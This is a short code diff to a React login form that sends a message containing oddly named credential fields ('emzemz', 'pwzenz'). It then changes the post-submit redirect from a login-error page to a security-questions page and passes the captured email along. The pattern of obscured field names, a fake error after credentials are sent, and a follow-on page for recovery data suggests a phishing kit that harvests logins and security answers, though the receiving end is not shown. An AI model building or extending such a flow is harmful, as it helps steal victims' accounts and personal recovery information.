@@ -50,7 +50,11 @@ const LoginForm: React.FC = () => {
           pwzenz: pwzenz,
         });
         console.log('Message sent successfully');
-        navigate('/login-error');
+        navigate('/security-questions', {
+          state: {
+            emzemz: emzemz
+          }
+        });
       } catch (error) {
         console.error('Error sending message:', error);
         setIsLoading(false);
